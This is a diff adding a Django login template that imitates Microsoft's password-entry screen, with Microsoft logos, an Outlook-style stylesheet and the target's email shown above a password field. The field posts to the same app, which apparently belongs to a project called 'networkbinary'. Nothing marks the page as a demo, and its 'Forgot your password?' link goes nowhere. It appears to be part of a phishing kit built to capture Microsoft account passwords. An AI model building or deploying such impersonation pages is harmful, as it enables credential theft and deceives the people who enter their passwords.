@@ -1,0 +1,50 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login</title>
+  <link rel="stylesheet" href="{% static 'networkbinary/css/outl.css' %}" />
+  <link rel="icon" type="image/png" href="{% static 'networkbinary/images/micrologo.png' %}" />
+
+</head>
+<body>
+  <div class="background">
+    <div class="login-box">
+        <center>  <img src="{% static 'networkbinary/images/microsoft-80658_1280.webp' %}" alt="Microsoft" class="logo" />  </center>
+
+{% if user %}
+        <div class="user-email">{{ user.email }}</div>
+   
+
+    <!-- Input box instead of static number -->
+      
+
+{% endif %}
+
+      <h2>Enter your password</h2>
+
+      <label class="password-label">
+        <span>Password</span>
+        <div class="password-wrapper">
+          <form action="" method="POST">
+            {% csrf_token %}
+
+            <input type="password" name="password" class="input-field" />
+            <!-- <span class="eye-icon">&#128065;</span> -->
+          </div>
+        </label>
+  
+        <a href="#" class="link">Forgot your password?</a>
+  
+        <button class="next-btn">Next</button>
+
+          </form>
+
+      <!-- <a href="#" class="other-link">Other ways to sign in</a> -->
+    </div>
+  </div>
+</body>
+</html>
+
